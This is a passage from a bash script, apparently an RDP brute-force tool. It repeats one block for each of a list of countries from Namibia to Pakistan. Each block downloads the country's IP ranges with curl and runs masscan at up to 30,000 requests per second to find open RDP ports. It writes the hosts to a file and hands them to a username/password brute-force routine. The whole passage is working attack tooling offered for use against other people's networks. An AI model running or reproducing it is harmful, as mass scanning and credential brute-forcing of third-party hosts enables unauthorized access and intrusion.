echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN

else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "126" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NAMIBIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Namibia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "127" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NAURU |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nauru://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "128" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NEPAL |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nepal://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "129" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NETHERLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Netherlands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "130" ]; then
curl http://services.ce3c.be/ciprg/?countrys=MONTENEGRO |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Montenegro://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "131" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NEW+CALEDONIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/New Caledonia://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "132" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NEW+ZEALAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/New Zealand://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "133" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NICARAGUA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nicaragua://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "134" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NIGER |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Niger://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "135" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NIGERIA |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Nigeria://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "136" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NIUE |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Niue://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "137" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NON-SPEC+ASIA+PAS+LOCATION |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Non-spec Asia Pas Location://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "138" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NORFOLK+ISLAND |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Norfolk Island://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "139" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NORTHERN+MARIANA+ISLANDS |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Northern Mariana Islands://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "140" ]; then
curl http://services.ce3c.be/ciprg/?countrys=NORWAY |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Norway://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "141" ]; then
curl http://services.ce3c.be/ciprg/?countrys=OMAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/OMAN://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN
else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "142" ]; then
curl http://services.ce3c.be/ciprg/?countrys=PAKISTAN |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/Pakistan://g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""


echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"


echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done
masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILEEN



echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"




MAINBRUTEMENUEN


else
clear

echo -e "$aquamarine                                             Get a list of IP"
echo ""


if [ "$country"  = "143" ]; then
